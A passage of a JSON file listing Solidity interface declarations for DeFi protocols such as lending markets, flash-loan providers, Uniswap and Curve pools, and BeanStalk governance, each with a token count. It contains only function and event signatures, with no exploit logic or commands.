                    },
                    {
                        "name": "IUnitroller",
                        "content": "interface IUnitroller {\n  function enterMarkets(address[] memory cTokens)\n  external\n  returns (uint256[] memory);\n\n  function exitMarket(address cTokenAddress) external returns (uint256);\n\n  function cTokensByUnderlying(address) external view returns (address);\n\n  function getAccountLiquidity(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function borrowCaps(address) external view returns (uint256);\n  function getAllMarkets() external view returns (address[] memory);\n}\n",
                        "token_count": 118,
                        "imported": true
                    },
                    {
                        "name": "IBalancerVault",
                        "content": "interface IBalancerVault {\n  enum SwapKind { GIVEN_IN, GIVEN_OUT }\n  struct SingleSwap {\n        bytes32 poolId;\n        SwapKind kind;\n        address assetIn;\n        address assetOut;\n        uint256 amount;\n        bytes userData;\n    }\n  struct FundManagement {\n        address sender;\n        bool fromInternalBalance;\n        address payable recipient;\n        bool toInternalBalance;\n    }\n  function swap(\n        SingleSwap memory singleSwap,\n        FundManagement memory funds,\n        uint256 limit,\n        uint256 deadline\n    )\n        external\n        payable\n        returns(uint256 amountCalculated);\n  struct JoinPoolRequest {\n        address[] asset;\n        uint256[] maxAmountsIn;\n        bytes userData;\n        bool fromInternalBalance;\n    }\n\n  struct ExitPoolRequest {\n        address[] asset;\n        uint256[] minAmountsOut;\n        bytes userData;\n        bool toInternalBalance;\n    }\n\n  function joinPool(\n        bytes32 poolId,\n        address sender,\n        address recipient,\n        JoinPoolRequest memory request\n    ) external payable;\n  \n  function exitPool(\n        bytes32 poolId,\n        address sender,\n        address payable recipient,\n        ExitPoolRequest memory request\n    ) external payable;\n\n  function flashLoan(\n    address recipient,\n    address[] memory tokens,\n    uint256[] memory amounts,\n    bytes memory userData\n  ) external;\n}\n",
                        "token_count": 285,
                        "imported": true
                    },
                    {
                        "name": "ICointroller",
                        "content": "interface ICointroller {\n  event ActionPaused(string action, bool pauseState);\n  event ActionPaused(address rToken, string action, bool pauseState);\n  event ContributorRifiSpeedUpdated(\n    address indexed contributor,\n    uint256 newSpeed\n  );\n  event DistributedBorrowerRifi(\n    address indexed rToken,\n    address indexed borrower,\n    uint256 rifiDelta,\n    uint256 rifiBorrowIndex\n  );\n  event DistributedSupplierRifi(\n    address indexed rToken,\n    address indexed supplier,\n    uint256 rifiDelta,\n    uint256 rifiSupplyIndex\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event MarketEntered(address rToken, address account);\n  event MarketExited(address rToken, address account);\n  event MarketListed(address rToken);\n  event NewBorrowCap(address indexed rToken, uint256 newBorrowCap);\n  event NewBorrowCapGuardian(\n    address oldBorrowCapGuardian,\n    address newBorrowCapGuardian\n  );\n  event NewCloseFactor(\n    uint256 oldCloseFactorMantissa,\n    uint256 newCloseFactorMantissa\n  );\n  event NewCollateralFactor(\n    address rToken,\n    uint256 oldCollateralFactorMantissa,\n    uint256 newCollateralFactorMantissa\n  );\n  event NewLiquidationIncentive(\n    uint256 oldLiquidationIncentiveMantissa,\n    uint256 newLiquidationIncentiveMantissa\n  );\n  event NewPauseGuardian(address oldPauseGuardian, address newPauseGuardian);\n  event NewPriceOracle(address oldPriceOracle, address newPriceOracle);\n  event RifiGranted(address recipient, uint256 amount);\n  event RifiSpeedUpdated(address indexed rToken, uint256 newSpeed);\n\n  function _become(address unitroller) external;\n\n  function _borrowGuardianPaused() external view returns (bool);\n\n  function _grantRifi(address recipient, uint256 amount) external;\n\n  function _mintGuardianPaused() external view returns (bool);\n\n  function _setBorrowCapGuardian(address newBorrowCapGuardian) external;\n\n  function _setBorrowPaused(address rToken, bool state) external returns (bool);\n\n  function _setCloseFactor(uint256 newCloseFactorMantissa)\n  external\n  returns (uint256);\n\n  function _setCollateralFactor(\n    address rToken,\n    uint256 newCollateralFactorMantissa\n  ) external returns (uint256);\n\n  function _setContributorRifiSpeed(address contributor, uint256 rifiSpeed)\n  external;\n\n  function _setLiquidationIncentive(uint256 newLiquidationIncentiveMantissa)\n  external\n  returns (uint256);\n\n  function _setMarketBorrowCaps(\n    address[] memory rTokens,\n    uint256[] memory newBorrowCaps\n  ) external;\n\n  function _setMintPaused(address rToken, bool state) external returns (bool);\n\n  function _setPauseGuardian(address newPauseGuardian)\n  external\n  returns (uint256);\n\n  function _setPriceOracle(address newOracle) external returns (uint256);\n\n  function _setRifiSpeed(address rToken, uint256 rifiSpeed) external;\n\n  function _setSeizePaused(bool state) external returns (bool);\n\n  function _setTransferPaused(bool state) external returns (bool);\n\n  function _supportMarket(address rToken) external returns (uint256);\n\n  function accountAssets(address, uint256) external view returns (address);\n\n  function admin() external view returns (address);\n\n  function allMarkets(uint256) external view returns (address);\n\n  function borrowAllowed(\n    address rToken,\n    address borrower,\n    uint256 borrowAmount\n  ) external returns (uint256);\n\n  function borrowCapGuardian() external view returns (address);\n\n  function borrowCaps(address) external view returns (uint256);\n\n  function borrowGuardianPaused(address) external view returns (bool);\n\n  function borrowVerify(\n    address rToken,\n    address borrower,\n    uint256 borrowAmount\n  ) external;\n\n  function checkMembership(address account, address rToken)\n  external\n  view\n  returns (bool);\n\n  function claimRifi(\n    address[] memory holders,\n    address[] memory rTokens,\n    bool borrowers,\n    bool suppliers\n  ) external;\n\n  function claimRifi(address holder, address[] memory rTokens) external;\n\n  function claimRifi(address holder) external;\n\n  function closeFactorMantissa() external view returns (uint256);\n\n  function cointrollerImplementation() external view returns (address);\n\n  function enterMarkets(address[] memory rTokens)\n  external\n  returns (uint256[] memory);\n\n  function exitMarket(address rTokenAddress) external returns (uint256);\n\n  function getAccountLiquidity(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getAllMarkets() external view returns (address[] memory);\n\n  function getAssetsIn(address account)\n  external\n  view\n  returns (address[] memory);\n\n  function getBlockNumber() external view returns (uint256);\n\n  function getHypotheticalAccountLiquidity(\n    address account,\n    address rTokenModify,\n    uint256 redeemTokens,\n    uint256 borrowAmount\n  )\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getRifiAddress() external view returns (address);\n\n  function initialize(address rifi) external;\n\n  function isCointroller() external view returns (bool);\n\n  function lastContributorBlock(address) external view returns (uint256);\n\n  function liquidateBorrowAllowed(\n    address rTokenBorrowed,\n    address rTokenCollateral,\n    address liquidator,\n    address borrower,\n    uint256 repayAmount\n  ) external returns (uint256);\n\n  function liquidateBorrowVerify(\n    address rTokenBorrowed,\n    address rTokenCollateral,\n    address liquidator,\n    address borrower,\n    uint256 actualRepayAmount,\n    uint256 seizeTokens\n  ) external;\n\n  function liquidateCalculateSeizeTokens(\n    address rTokenBorrowed,\n    address rTokenCollateral,\n    uint256 actualRepayAmount\n  ) external view returns (uint256);\n\n  function liquidationIncentiveMantissa() external view returns (uint256);\n\n  function markets(address)\n  external\n  view\n  returns (\n    bool isListed,\n    uint256 collateralFactorMantissa,\n    bool isRified\n  );\n\n  function maxAssets() external view returns (uint256);\n\n  function mintAllowed(\n    address rToken,\n    address minter,\n    uint256 mintAmount\n  ) external returns (uint256);\n\n  function mintGuardianPaused(address) external view returns (bool);\n\n  function mintVerify(\n    address rToken,\n    address minter,\n    uint256 actualMintAmount,\n    uint256 mintTokens\n  ) external;\n\n  function oracle() external view returns (address);\n\n  function pauseGuardian() external view returns (address);\n\n  function pendingAdmin() external view returns (address);\n\n  function pendingCointrollerImplementation() external view returns (address);\n\n  function redeemAllowed(\n    address rToken,\n    address redeemer,\n    uint256 redeemTokens\n  ) external returns (uint256);\n\n  function redeemVerify(\n    address rToken,\n    address redeemer,\n    uint256 redeemAmount,\n    uint256 redeemTokens\n  ) external;\n\n  function repayBorrowAllowed(\n    address rToken,\n    address payer,\n    address borrower,\n    uint256 repayAmount\n  ) external returns (uint256);\n\n  function repayBorrowVerify(\n    address rToken,\n    address payer,\n    address borrower,\n    uint256 actualRepayAmount,\n    uint256 borrowerIndex\n  ) external;\n\n  function rifiAccrued(address) external view returns (uint256);\n\n  function rifiBorrowState(address)\n  external\n  view\n  returns (uint224 index, uint32 block);\n\n  function rifiBorrowerIndex(address, address) external view returns (uint256);\n\n  function rifiContributorSpeeds(address) external view returns (uint256);\n\n  function rifiInitialIndex() external view returns (uint224);\n\n  function rifiRate() external view returns (uint256);\n\n  function rifiSpeeds(address) external view returns (uint256);\n\n  function rifiSupplierIndex(address, address) external view returns (uint256);\n\n  function rifiSupplyState(address)\n  external\n  view\n  returns (uint224 index, uint32 block);\n\n  function seizeAllowed(\n    address rTokenCollateral,\n    address rTokenBorrowed,\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function seizeGuardianPaused() external view returns (bool);\n\n  function seizeVerify(\n    address rTokenCollateral,\n    address rTokenBorrowed,\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external;\n\n  function transferAllowed(\n    address rToken,\n    address src,\n    address dst,\n    uint256 transferTokens\n  ) external returns (uint256);\n\n  function transferGuardianPaused() external view returns (bool);\n\n  function transferVerify(\n    address rToken,\n    address src,\n    address dst,\n    uint256 transferTokens\n  ) external;\n\n  function updateContributorRewards(address contributor) external;\n}\n",
                        "token_count": 1996,
                        "imported": true
                    },
                    {
                        "name": "IPriceFeed",
                        "content": "interface IPriceFeed {\n  function decimals() external view returns (uint8);\n\n  function description() external view returns (string memory);\n\n  function version() external view returns (uint256);\n\n  function getRoundData(uint80 _roundId)\n  external\n  view\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  );\n\n  function latestRoundData()\n  external\n  view\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  );\n\n  function fetchPrice() external returns (uint256);\n}\n",
                        "token_count": 147,
                        "imported": true
                    },
                    {
                        "name": "IRToken",
                        "content": "interface IRToken {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address rTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewCointroller(address oldCointroller, address newCointroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _becomeImplementation(bytes memory data) external;\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _resignImplementation() external;\n\n  function _setCointroller(address newCointroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function cointroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address underlying_,\n    address cointroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function initialize(\n    address cointroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isRToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address rTokenCollateral\n  ) external returns (uint256);\n\n  function mint() external payable;\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function sweepToken(address token) external;\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1258,
                        "imported": true
                    },
                    {
                        "name": "ISimplePriceOracle",
                        "content": "interface ISimplePriceOracle {\n  event PricePosted(\n    address asset,\n    uint256 previousPriceMantissa,\n    uint256 requestedPriceMantissa,\n    uint256 newPriceMantissa\n  );\n\n  function getUnderlyingPrice(address rToken) external view returns (uint256);\n\n  function isPriceOracle() external view returns (bool);\n\n  function oracleData(address) external view returns (address);\n\n  function setOracleData(address rToken, address _oracle) external;\n}\n",
                        "token_count": 101,
                        "imported": true
                    },
                    {
                        "name": "ITreasureMarketplaceBuyer",
                        "content": "interface ITreasureMarketplaceBuyer {\n  function buyItem(\n    address _nftAddress,\n    uint256 _tokenId,\n    address _owner,\n    uint256 _quantity,\n    uint256 _pricePerItem\n  ) external;\n\n  function marketplace() external view returns (address);\n\n  function onERC1155BatchReceived(\n    address,\n    address,\n    uint256[] memory,\n    uint256[] memory,\n    bytes memory\n  ) external returns (bytes4);\n\n  function onERC1155Received(\n    address,\n    address,\n    uint256,\n    uint256,\n    bytes memory\n  ) external returns (bytes4);\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) external returns (bytes4);\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool);\n\n  function withdraw() external;\n\n  function withdrawNFT(\n    address _nftAddress,\n    uint256 _tokenId,\n    uint256 _quantity\n  ) external;\n}\n",
                        "token_count": 213,
                        "imported": true
                    },
                    {
                        "name": "IERC721",
                        "content": "interface IERC721 {\n  event Transfer(\n    address indexed from,\n    address indexed to,\n    uint256 indexed tokenId\n  );\n  event Approval(\n    address indexed owner,\n    address indexed approved,\n    uint256 indexed tokenId\n  );\n  event ApprovalForAll(\n    address indexed owner,\n    address indexed operator,\n    bool approved\n  );\n\n  function balanceOf(address owner) external view returns (uint256 balance);\n\n  function ownerOf(uint256 tokenId) external view returns (address owner);\n\n  function safeTransferFrom(\n    address from,\n    address to,\n    uint256 tokenId\n  ) external;\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 tokenId\n  ) external;\n\n  function approve(address to, uint256 tokenId) external;\n\n  function getApproved(uint256 tokenId)\n  external\n  view\n  returns (address operator);\n\n  function setApprovalForAll(address operator, bool _approved) external;\n\n  function isApprovedForAll(address owner, address operator)\n  external\n  view\n  returns (bool);\n\n  function safeTransferFrom(\n    address from,\n    address to,\n    uint256 tokenId,\n    bytes calldata data\n  ) external;\n}\n",
                        "token_count": 246,
                        "imported": true
                    },
                    {
                        "name": "IRewardsHypervisor",
                        "content": "interface IRewardsHypervisor {\n  function deposit(\n    uint256 visrDeposit,\n    address from,\n    address to\n  ) external returns (uint256 shares);\n\n  function owner() external view returns (address);\n\n  function snapshot() external;\n\n  function transferOwnership(address newOwner) external;\n\n  function transferTokenOwnership(address newOwner) external;\n\n  function visr() external view returns (address);\n\n  function vvisr() external view returns (address);\n\n  function withdraw(\n    uint256 shares,\n    address to,\n    address from\n  ) external returns (uint256 rewards);\n}\n",
                        "token_count": 123,
                        "imported": true
                    },
                    {
                        "name": "IvVISR",
                        "content": "interface IvVISR {\n  function balanceOf(address account) external view returns (uint256);\n\n  function mint(address account, uint256 amount) external;\n}\n",
                        "token_count": 32,
                        "imported": true
                    },
                    {
                        "name": "InotVerified",
                        "content": "interface InotVerified {\n  function mint(uint256 value) external;\n\n  function redeem(uint256 value) external;\n}\n",
                        "token_count": 24,
                        "imported": true
                    },
                    {
                        "name": "IRouter",
                        "content": "interface IRouter {\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n  ) external;\n}\n",
                        "token_count": 141,
                        "imported": true
                    },
                    {
                        "name": "ILendingPool",
                        "content": "interface ILendingPool {\n  function flashLoan(\n    address receiverAddress,\n    address[] calldata assets,\n    uint256[] calldata amounts,\n    uint256[] calldata modes,\n    address onBehalfOf,\n    bytes calldata params,\n    uint16 referralCode\n  ) external;\n\n  function repay(address _reserve, uint256 _amount, address _onBehalfOf) external payable;\n}\n",
                        "token_count": 84,
                        "imported": true
                    },
                    {
                        "name": "VyperContract",
                        "content": "interface VyperContract {\n  function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount)\n  external;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function mint(address account, uint256 value) external;\n\n  function approve(address spender, uint256 value) external;\n\n  function transferUnderlyingTo(address target, uint256 amount)\n  external\n  returns (uint256);\n\n  function deposit(uint256 amounts, address recipient)\n  external\n  returns (uint256);\n\n  function exchange(\n    address _pool,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint256 _expected,\n    address _receiver\n  ) external returns (uint256);\n\n  function remove_liquidity_one_coin(\n    uint256 _token_amount,\n    int128 i,\n    uint256 min_amount\n  ) external;\n}\n",
                        "token_count": 185,
                        "imported": true
                    },
                    {
                        "name": "IAggregator",
                        "content": "interface IAggregator {\n  function latestAnswer() external view returns (int256 answer);\n}\n",
                        "token_count": 19,
                        "imported": true
                    },
                    {
                        "name": "CErc20Interface",
                        "content": "interface CErc20Interface {\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n}\n",
                        "token_count": 49,
                        "imported": true
                    },
                    {
                        "name": "IUSDT",
                        "content": "interface IUSDT {\n  function approve(address _spender, uint256 _value) external;\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function transfer(address _to, uint256 _value) external;\n}\n",
                        "token_count": 48,
                        "imported": true
                    },
                    {
                        "name": "IDaiFlashloan",
                        "content": "interface IDaiFlashloan {\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool);\n}\n",
                        "token_count": 38,
                        "imported": true
                    },
                    {
                        "name": "IAaveFlashloan",
                        "content": "interface IAaveFlashloan {\n    function flashLoan(\n        address receiverAddress,\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata modes,\n        address onBehalfOf,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n     function flashLoanSimple(\n    address receiverAddress,\n    address asset,\n    uint256 amount,\n    bytes calldata params,\n    uint16 referralCode\n  ) external;\n}\n",
                        "token_count": 99,
                        "imported": true
                    },
                    {
                        "name": "IcurveYSwap",
                        "content": "interface IcurveYSwap {\n  function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;\n\n  function exchange_underlying(\n    int128 i,\n    int128 j,\n    uint256 dx,\n    uint256 min_dy\n  ) external;\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "IHarvestUsdcVault",
                        "content": "interface IHarvestUsdcVault {\n  function deposit(uint256 amountWei) external;\n\n  function withdraw(uint256 numberOfShares) external;\n\n  function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 43,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Router",
                        "content": "interface IUniswapV2Router {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1173,
                        "imported": true
                    },
                    {
                        "name": "ICurvePool",
                        "content": "interface ICurvePool {\n  function A() external view returns (uint256 out);\n\n  function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount)\n  external payable returns(uint256);\n\n  function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount)\n  external returns(uint256);\n\n  function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount)\n  external returns(uint256);\n\n  function admin_fee() external view returns (uint256 out);\n\n  function balances(uint256 arg0) external view returns (uint256 out);\n\n  function calc_token_amount(uint256[] memory amounts, bool is_deposit)\n  external\n  view\n  returns (uint256 lp_tokens);\n\n  /// @dev vyper upgrade changed this on us\n  function coins(int128 arg0) external view returns (address out);\n\n  /// @dev vyper upgrade changed this on us\n  function coins(uint256 arg0) external view returns (address out);\n\n  /// @dev vyper upgrade changed this on us\n  function underlying_coins(int128 arg0) external view returns (address out);\n\n  /// @dev vyper upgrade changed this on us\n  function underlying_coins(uint256 arg0) external view returns (address out);\n\n  function exchange(\n    int128 i,\n    int128 j,\n    uint256 dx,\n    uint256 min_dy\n  ) external;\n\n  // newer pools have this improved version of exchange_underlying\n  function exchange(\n    int128 i,\n    int128 j,\n    uint256 dx,\n    uint256 min_dy,\n    address receiver\n  ) external returns (uint256);\n\n  function exchange_underlying(\n    int128 i,\n    int128 j,\n    uint256 dx,\n    uint256 min_dy\n  ) external;\n\n  function exchange_underlying(\n      address pool,\n      int128 i,\n      int128 j,\n      uint256 dx,\n      uint256 min_dy\n  ) external;\n\n  function fee() external view returns (uint256 out);\n\n  function future_A() external view returns (uint256 out);\n\n  function future_fee() external view returns (uint256 out);\n\n  function future_admin_fee() external view returns (uint256 out);\n\n  function get_dy(\n    int128 i,\n    int128 j,\n    uint256 dx\n  ) external view returns (uint256);\n\n  function get_dy_underlying(\n    int128 i,\n    int128 j,\n    uint256 dx\n  ) external view returns (uint256);\n\n  function get_virtual_price() external view returns (uint256 out);\n\n  function remove_liquidity(uint256 token_amount, uint256[3] memory min_amounts)\n  external\n  returns (uint256[3] memory);\n\n  function remove_liquidity_imbalance(\n    uint256[3] memory amounts,\n    uint256 max_burn_amount\n  ) external;\n\n  function remove_liquidity_one_coin(\n    uint256 token_amount,\n    int128 i,\n    uint256 min_amount\n  ) external;\n}\n",
                        "token_count": 635,
                        "imported": true
                    },
                    {
                        "name": "IBeanStalk",
                        "content": "interface IBeanStalk {\n  function depositBeans(uint256) external;\n\n  function emergencyCommit(uint32 bip) external;\n\n  function deposit(address token, uint256 amount) external;\n\n  function vote(uint32 bip) external;\n\n  function bip(uint32 bipId)\n  external\n  view\n  returns (\n    address,\n    uint32,\n    uint32,\n    bool,\n    int256,\n    uint128,\n    uint256,\n    uint256\n  );\n\n  struct FacetCut {\n    address facetAddress;\n    uint8 action;\n    bytes4[] functionSelectors;\n  }\n\n  function propose(\n    FacetCut[] calldata _diamondCut,\n    address _init,\n    bytes calldata _calldata,\n    uint8 _pauseOrUnpause\n  ) external;\n\n  function numberOfBips() external view returns (uint32);\n}\n",
                        "token_count": 175,
                        "imported": true
                    },
                    {
                        "name": "INOVO",
                        "content": "interface INOVO {\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "IBuildFinance",
